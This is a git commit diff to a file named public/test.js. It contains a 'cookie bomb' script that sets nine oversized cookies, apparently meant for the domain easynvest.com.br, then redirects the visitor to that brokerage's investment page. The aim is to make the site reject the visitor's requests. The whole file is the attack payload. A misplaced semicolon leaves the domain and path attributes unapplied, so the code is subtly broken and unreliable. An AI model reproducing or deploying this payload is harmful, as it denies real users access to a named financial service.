127b91c54774061c3fde8a5c65d6e54f6bb1c703
GouveaHeitor <hi@heitorgouvea.me>
2020-05-14 23:14:49 -0300

    Update test.js

--- public/test.js
+++ public/test.js
@@ -1,5 +1,5 @@
 for (var i = 1; i < 10; i++) {
-    document.cookie='CookieBomb' + i + '=' + Array(4000).join('a'); + ';Domain=.easynvest.com.br'
+    document.cookie='CookieBomb' + i + '=' + Array(4000).join('a'); + ';Domain=.easynvest.com.br;path=/'
 }
 
 window.location="https://easynvest.com.br/acompanhar/investimentos";
